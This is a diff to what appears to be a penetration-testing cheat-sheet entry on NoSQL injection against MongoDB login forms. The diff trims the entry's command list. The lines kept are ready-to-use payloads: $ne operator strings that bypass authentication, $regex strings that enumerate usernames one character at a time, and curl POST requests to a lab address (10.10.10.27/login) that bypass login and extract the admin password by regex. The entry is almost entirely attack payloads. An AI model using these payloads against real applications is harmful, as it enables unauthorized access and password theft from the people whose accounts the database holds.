@@ -2,31 +2,20 @@
 description: |
   NoSQL injection techniques against MongoDB and similar databases — authentication bypass, data extraction, and operator abuse.
 command: |
-  # Authentication bypass — POST body with $ne operator
+  # Authentication bypass — $ne operator
   username[$ne]=admin&password[$ne]=pass
 
-  # Regex-based extraction — enumerate usernames
+  # Regex extraction — enumerate usernames char by char
   username[$regex]=^a.*&password[$ne]=pass
   username[$regex]=^ad.*&password[$ne]=pass
-  username[$regex]=^adm.*&password[$ne]=pass
 
-  # JSON body — authentication bypass
+  # JSON body — auth bypass
   curl -X POST http://10.10.10.27/login -H "Content-Type: application/json" \
     -d '{"username":{"$ne":""},"password":{"$ne":""}}'
 
-  # Extract password character by character
+  # Extract password with $regex
   curl -X POST http://10.10.10.27/login -H "Content-Type: application/json" \
     -d '{"username":"admin","password":{"$regex":"^P.*"}}'
-  curl -X POST http://10.10.10.27/login -H "Content-Type: application/json" \
-    -d '{"username":"admin","password":{"$regex":"^Pa.*"}}'
-
-  # $gt operator bypass
-  curl -X POST http://10.10.10.27/login -H "Content-Type: application/json" \
-    -d '{"username":{"$gt":""},"password":{"$gt":""}}'
-
-  # Enumerate users with $regex
-  curl -X POST http://10.10.10.27/login -H "Content-Type: application/json" \
-    -d '{"username":{"$regex":".*"},"password":{"$ne":""}}'
 items:
   - No_Creds
 phase:
